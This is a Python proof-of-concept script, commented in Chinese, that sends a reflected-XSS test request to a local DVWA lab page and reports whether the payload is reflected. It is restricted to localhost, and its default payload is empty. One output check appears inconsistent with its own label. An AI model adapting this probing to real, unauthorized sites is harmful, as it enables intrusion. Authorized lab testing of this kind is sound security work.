poc.code: #!/usr/bin/env python3 """XSS-003 反射型 XSS 教学验证草案（无害标记，仅限本机授权靶场）。 用法示例: python poc_xss_003.py --base http://127.0.0.1/dvwa --path /vulnerabilities/xss_r/ --param name --cookie-file cookie.txt 约束: 仅允许 localhost/127.0.0.1/::1；不跟随重定向；不打印 Cookie/口令。 """ import argparse import sys import urllib.error import urllib.parse import urllib.request MARKER = "LLM_LAB_XSS" ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"} DEFAULT_PAYLOAD = "" class NoRedirect(urllib.request.HTTPRedirectHandler): def redirect_request(self, req, fp, code, msg, headers, newurl): return None def parse_args(): parser = argparse.ArgumentParser(description="XSS-003 验证草案") parser.add_argument("--base", required=True, help="靶场基址，例如 http://127.0.0.1/dvwa") parser.add_argument("--path", required=True, help="目标页面路径，例如 /vulnerabilities/xss_r/") parser.add_argument("--param", default="name", help="请求参数名，默认 name") parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="无害测试载荷") parser.add_argument("--cookie-file", default=None, help="本地文件中的 Cookie 头，内容不打印") parser.add_argument("--timeout", type=float, default=10.0, help="请求超时秒数") return parser.parse_args() def build_url(args): url = args.base.rstrip("/") + "/" + args.path.lstrip("/") parts = urllib.parse.urlsplit(url) if parts.scheme not in ("http", "https"): sys.exit("协议不被允许: " + str(parts.scheme)) if (parts.hostname or "").lower() not in ALLOWED_HOSTS: sys.exit("仅允许本机地址，收到: " + str(parts.hostname)) return url def main(): args = parse_args() url = build_url(args) target = url + ("&" if "?" in url else "?") + urllib.parse.urlencode({args.param: args.payload}) headers = {"User-Agent": "XSS-003-lab-draft"} if args.cookie_file: with open(args.cookie_file, "r", encoding="utf-8") as handle: headers["Cookie"] = handle.read().strip() request = urllib.request.Request(target, headers=headers, method="GET") opener = urllib.request.build_opener(NoRedirect) try: with opener.open(request, timeout=args.timeout) as response: status = response.status body = response.read().decode("utf-8", "replace") except urllib.error.HTTPError as exc: sys.exit("HTTP 错误: %s（302 多为未登录，需人工确认认证与路径）" % exc.code) except urllib.error.URLError as exc: sys.exit("连接失败: %s" % exc.reason) print("target:", target) print("status:", status) print("payload_raw_in_body:", args.payload in body) print("payload_html_encoded:", "<img" in body) if args.payload in body: print("回显观察: 响应中 payload 以原始标签出现；浏览器是否执行需人工在 Console 观察 " + MARKER) else: print("回显观察: 未发现原样 payload；核对参数名、登录状态、难度配置与输出编码") if __name__ == "__main__": main()
